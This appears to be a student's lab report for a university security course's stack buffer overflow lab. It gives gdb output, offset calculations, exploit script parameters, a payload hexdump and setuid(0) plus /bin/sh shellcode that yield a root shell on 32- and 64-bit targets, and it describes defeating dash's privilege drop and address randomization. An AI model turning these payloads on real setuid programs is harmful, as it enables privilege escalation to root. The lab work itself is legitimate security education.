# Cloning repo and preparing submission directories
In screenshot1.png , for first task date is not show as it would expose personal access token please forgive
we succesfully show a local repo is created 
In screenshot2 we show Reports/Artifacts succesfully created for submission. 
In screenshots2.1-2.2 we show commands executed to turn off countermeasures

# Invoking the shellcode
After typing make on shellcode directory as shown in screenshot3.4 we see the following commands execute 
```
gcc -m32 -z execstack -o a32.out call_shellcode.c
gcc -z execstack -o a64.out call_shellcode.c
```
We run ./a32.out and ./a64.out nothing appears on the terminal, we type exit to return to a functional shell. as shown in screenshot3.4.1 and 3.4.2
# Task 4 understanding the vulnerable program
After understanding the vulnerable program we execute make command as shown in screenshot4 and we are ready to investigate.

# Launching and investigation of 32 bit attack

The following is the output from our gdb commands as shown in screenshots5-5.1:
```
Breakpoint 1 at 0x12ad: file stack.c, line 16.
gdb-peda$ run
Starting program: /home/nyuappsec/AppSec1/Part1/code/stack-L1-dbg 
Input size: 0
[----------------------------------registers-----------------------------------]
EAX: 0xffffcb48 --> 0x0 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x60 ('`')
EDX: 0xffffcf30 --> 0xf7fb4000 --> 0x1ead6c 
ESI: 0xf7fb4000 --> 0x1ead6c 
EDI: 0xf7fb4000 --> 0x1ead6c 
EBP: 0xffffcf38 --> 0xffffd168 --> 0x0 
ESP: 0xffffcb2c --> 0x565563ee (<dummy_function+62>:	add    esp,0x10)
EIP: 0x565562ad (<bof>:	endbr32)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562a4 <frame_dummy+4>:	jmp    0x56556200 <register_tm_clones>
   0x565562a9 <__x86.get_pc_thunk.dx>:	mov    edx,DWORD PTR [esp]
   0x565562ac <__x86.get_pc_thunk.dx+3>:	ret    
=> 0x565562ad <bof>:	endbr32 
   0x565562b1 <bof+4>:	push   ebp
   0x565562b2 <bof+5>:	mov    ebp,esp
   0x565562b4 <bof+7>:	push   ebx
   0x565562b5 <bof+8>:	sub    esp,0x74
[------------------------------------stack-------------------------------------]
0000| 0xffffcb2c --> 0x565563ee (<dummy_function+62>:	add    esp,0x10)
0004| 0xffffcb30 --> 0xffffcf53 --> 0x456 
0008| 0xffffcb34 --> 0x0 
0012| 0xffffcb38 --> 0x3e8 
0016| 0xffffcb3c --> 0x565563c3 (<dummy_function+19>:	add    eax,0x2bf5)
0020| 0xffffcb40 --> 0x0 
0024| 0xffffcb44 --> 0x0 
0028| 0xffffcb48 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, bof (str=0xffffcf53 "V\004") at stack.c:16
16	{
gdb-peda$ next
[----------------------------------registers-----------------------------------]
EAX: 0x56558fb8 --> 0x3ec0 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x60 ('`')
EDX: 0xffffcf30 --> 0xf7fb4000 --> 0x1ead6c 
ESI: 0xf7fb4000 --> 0x1ead6c 
EDI: 0xf7fb4000 --> 0x1ead6c 
EBP: 0xffffcb28 --> 0xffffcf38 --> 0xffffd168 --> 0x0 
ESP: 0xffffcab0 ("1pUVD\317\377\377\220\325\377\367\340\223\374", <incomplete sequence \367>)
EIP: 0x565562c2 (<bof+21>:	sub    esp,0x8)
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562b5 <bof+8>:	sub    esp,0x74
   0x565562b8 <bof+11>:	call   0x565563f7 <__x86.get_pc_thunk.ax>
   0x565562bd <bof+16>:	add    eax,0x2cfb
=> 0x565562c2 <bof+21>:	sub    esp,0x8
   0x565562c5 <bof+24>:	push   DWORD PTR [ebp+0x8]
   0x565562c8 <bof+27>:	lea    edx,[ebp-0x6c]
   0x565562cb <bof+30>:	push   edx
   0x565562cc <bof+31>:	mov    ebx,eax
[------------------------------------stack-------------------------------------]
0000| 0xffffcab0 ("1pUVD\317\377\377\220\325\377\367\340\223\374", <incomplete sequence \367>)
0004| 0xffffcab4 --> 0xffffcf44 --> 0x0 
0008| 0xffffcab8 --> 0xf7ffd590 --> 0xf7fd1000 --> 0x464c457f 
0012| 0xffffcabc --> 0xf7fc93e0 --> 0xf7ffd990 --> 0x56555000 --> 0x464c457f 
0016| 0xffffcac0 --> 0x0 
0020| 0xffffcac4 --> 0x0 
0024| 0xffffcac8 --> 0x0 
0028| 0xffffcacc --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
20	    strcpy(buffer, str);  
gdb-peda$ p $ebp
$1 = (void *) 0xffffcb28
gdb-peda$ p &buffer
$2 = (char (*)[100]) 0xffffcabc
```

Since we want to overflow buffer we need to find the offset between buffer and the top of the stack ebp we do this by.
```
nyuappsec@ubuntu:~$ python3
Python 3.8.10 (default, Nov 26 2021, 20:14:08) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(0xffffcb28-0xffffcabc)
'0x6c' or 108 bits apart in the stack. 
```
In the exploit-32.py file we edit the following values 

```
start = 517-len(shellcode)   # start from len(shellcode) from the end of array
ret = 0xffffcabc + 250       # return beyond ebp / NOP sled
offset = 108 + 4             #ebp-&buffer+4
```
This works because our vulnerable program has a buffer that takes up 108 bytes, we will then read the previous frames pointer and land in the return adress where
it would without the exploit run the existing code. We want to write more than the buffer of 108 bytes to run out malicious code without running code that is already in the stack. Filling it with NOPs allows us to do this. Adding 250 bytes to the buffer gives us plenty of room to land somewhere in the NOP sled to get the return adress we want to execute the malicious code. 
```
--contents of badfile--
00000000  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
*
00000070  b6 cb ff ff 90 90 90 90  90 90 90 90 90 90 90 90  |................|
00000080  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
*
000001e0  90 90 90 90 90 90 90 90  90 90 31 c0 50 68 2f 2f  |..........1.Ph//|
000001f0  73 68 68 2f 62 69 6e 89  e3 50 53 89 e1 31 d2 31  |shh/bin..PS..1.1|
00000200  c0 b0 0b cd 80                                    |.....|
00000205
#     
```
stack-L1 is a setuid program 
```
# ls -l stack-L1                                                               
-rwsr-xr-x 1 root nyuappsec 15908 Feb  8 13:44 stack-L1
```
so it will run what is in the buffer, because of the badfile created by the exploit; the program will run the shellcode with root permissions. See screenshot5.2

# Launching attack on 64 bit
First we must conduct an investgation on stack-L3-dbg
Using gdb we can see that $rbp and &buffer for stack-L3_dbg is the following.
```
db-peda$ p $rbp
$1 = (void *) 0x7fffffffd960

gdb-peda$ p &buffer
$3 = (char (*)[200]) 0x7fffffffd890
gdb-peda$ 

```
See screenshot6-6.1

In our exploit-64.py we change the shellcode to the 64 bit version provided in the shellcode directory 
as seen in screenshot6.2 we find the offset of rbp and &buffer to be d0 or 208 bytes

For 64 bit we must put the shellcode before the buffer because  strcpy() will terminate due to 64 bit adress leading zeroes.Since we should start before the bufffer, &buffer is 0x7fffffffd890 adress in little endian format is actually stored as 90 d8 ff ff ff 7f. To start the exploit lets try starting at 90
```
start = 90   # Change this number 
Decide the return address value 
and put it somewhere in the payload
#$rbp - &buffer = 208
ret =  0x7fffffffd890 + 160 # tried 100, 208 didn't work 150 and 160 did
offset = 208 + 8
```
when we add 100 to ret we get segmentation faul 
when we add 208 we get illegal operation 
150 is good 
160 is good 
In screenshot6.3 we see successful 64bit exploit
# Defeating dash's Countermeasure
In screenshot 7 we turn on the coutermeasure

After adding setuid(0) invocation binary to the beggining of shellcode in call_shellcode.c and running a32.out, a64.out
we get a root shell as expected. See screenshot 7.1. 
If we dont add setuid(0) shellcoude to exploit-32.py, exploit does not work with countermeasure turned and we get a Segmentation fault error.
Adding setuid(0) binary to exploit-32.py we now have
```
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80" 	
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80" 
).encode('latin-1')

```
we rm badfile from previous exploits and run ./exploit-32.py then run ./stackL1. 
exploit works with countermeasures turned on see screenshot7.2.

# Defeating Address Randomization
In screenshot8 we see we turn on adress randomization 
After 73 minutes we defeat it with exploit-32.py See screenshot8.1
# Experimenting with Other Countermeasures
